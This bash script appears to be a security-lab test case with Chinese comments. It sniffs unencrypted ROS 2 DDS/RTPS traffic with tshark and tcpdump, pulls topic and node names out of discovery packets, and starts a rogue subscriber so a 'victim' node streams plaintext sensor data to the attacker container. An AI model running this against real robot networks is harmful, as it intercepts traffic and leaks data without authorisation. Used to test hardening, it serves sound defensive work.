#!/usr/bin/env bash
# 測試案例 2.2：RTPS 探索/資料封包嗅探
#
# 目的：驗證未加密的 DDS/RTPS 流量可被嗅探（探索拓撲 + 明文資料）。
# 預期結果（未加固）：
#   (a) 抓到 RTPS DATA(p) 探索封包，內含節點/topic 名稱等拓撲明文。
#   (b) 攻擊者作為訂閱者時，/sensor_data 內容以明文出現在網路上。
# 成功判定：tshark 見 RTPS，且封包 payload 出現 "sensor_data"/"battery=" 明文。
#
# 埠計算：Fast-DDS metatraffic 埠 = 7400 + 250*ROS_DOMAIN_ID（本實驗 domain 42 => 17900+）。
#
# 用法（attacker/monitor 容器內，需 NET_RAW）：
#   bash /work/attacks/recon_rtps_sniff.sh [秒數]
set -o pipefail
DURATION="${1:-12}"
IFACE="${IFACE:-eth0}"
DOMAIN="${ROS_DOMAIN_ID:-0}"
BASE=$((7400 + 250 * DOMAIN))
HI=$((BASE + 250))
source /opt/ros/jazzy/setup.bash

echo "=== [2.2] RTPS 封包嗅探 (${DURATION}s, iface=${IFACE}, domain=${DOMAIN}, ports ${BASE}-${HI}) ==="

echo "--- (a) RTPS 子訊息統計（來源 -> 目的）---"
timeout "${DURATION}" tshark -i "${IFACE}" -Y rtps \
    -T fields -e ip.src -e ip.dst 2>/dev/null \
    | sort | uniq -c | sort -rn | head -15
echo ""

echo "--- (a) 探索封包中的拓撲明文（topic/node 名稱）---"
timeout "${DURATION}" tcpdump -i "${IFACE}" -A -s0 "udp portrange ${BASE}-${HI}" 2>/dev/null \
    | grep -aoE "(cmd_vel|sensor_data|victim_[a-z_]+|set_safety_mode)" \
    | sort | uniq -c | sort -rn | head
echo ""

echo "--- (b) 明文資料洩漏：同時以訂閱者身分讓資料流到本機，嗅探 payload ---"
# 背景啟動一個訂閱者，使 victim 將 /sensor_data 單播送到本機（.11），tshark 即可見明文
timeout $((DURATION + 2)) ros2 topic echo /sensor_data >/dev/null 2>&1 &
sleep 2
timeout "${DURATION}" tcpdump -i "${IFACE}" -A -s0 udp 2>/dev/null \
    | grep -a "battery=" | head -3 || echo "(未捕獲)"
wait 2>/dev/null
